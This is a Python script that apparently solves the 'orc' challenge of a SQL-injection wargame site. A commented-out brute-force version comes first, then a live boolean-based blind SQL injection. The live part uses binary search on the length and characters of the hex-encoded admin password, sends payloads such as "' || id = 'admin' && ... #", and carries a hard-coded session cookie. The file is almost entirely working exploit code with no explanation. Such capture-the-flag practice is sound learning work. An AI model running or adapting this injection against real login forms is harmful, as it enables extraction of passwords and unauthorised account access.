
# import binascii
# import urllib.parse
# import requests


import requests
url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
# cookie = "o390n0a72vrspg30ujnemh0bnf"
# candidates = [chr(i) for i in range(48, 48+10)] + \
#     [chr(i) for i in range(97, 97+26)] + \
#     [chr(i) for i in range(65, 65+26)] + \
#     ["_", "@", "$", "!", "?", "&", "#"]
# headers = {'Cookie': 'PHPSESSID='+cookie}
# print(candidates)


# def attack(attack_sql):
#     attack_url = url + '?pw=' + urllib.parse.quote(attack_sql)
#     # print(attack_url)
#     res = requests.get(attack_url, headers=headers)
#     # print(res.text)
#     return res


# def create_query(pw):
#     hex_pw = '0x' + binascii.hexlify(pw.encode()+b'%').decode()
#     template = f"'or id = 'admin' and substr(hex(pw),{len(pw)},1) = {ord(pw[-1])} #"

#     # template = "'or id='admin' and substr(pw," + \
#     #     str(len(pw)) + ",1)='" + pw[-1]
#     return template


# first = 1


# def check_result(res):
#     global first
#     if first:
#         print(res.text)
#         first = 0
#     if 'Hello admin' in res.text:
#         return True
#     return False


# correct_pass = ""
# is_end = False
# while True:
#     for c in candidates:
#         try_pass = correct_pass + str(c)
#         print(try_pass)
#         query = create_query(try_pass)

#         res = attack(query)
#         if check_result(res):
#             correct_pass += c
#             break
#     else:
#         break

# print("result = ", correct_pass)


# url = "https://los.rubiya.kr/chall/xavis_04f07asdfasdfsadfc390.php"
cookie = {'PHPSESSID': 'o390n0a72vrspg30ujnemh0bnf'}


def check(data) -> bool:
    return ("Hello admin" in data) or ("Hello guest" in data)


ok = 0
ng = 60

while ok + 1 != ng:
    md = (ok + ng) // 2
    q = f"' || id = 'admin' && {md} <= length(hex(pw)) #"
    res = requests.get(url, params={'pw': q}, cookies=cookie)
    print(f"[+] try {md}")
    if check(res.text):
        ok = md
    else:
        ng = md

length = ok
print(f"[*] length = {length}")

ans = ""
for i in range(0, length):
    ok = 0
    ng = 256

    while ok + 1 != ng:
        md = (ok + ng) // 2
        q = f"' || id = 'admin' && {md} <= ascii(substr(hex(pw),{i+1},1)) #"
        res = requests.get(url, params={'pw': q}, cookies=cookie)
        print(f"[+] try {md}")
        if check(res.text):
            ok = md
        else:
            ng = md

    ans += str(chr(ok))
    print(f"[*] {ans}")

print(f"[*] find! {ans}")
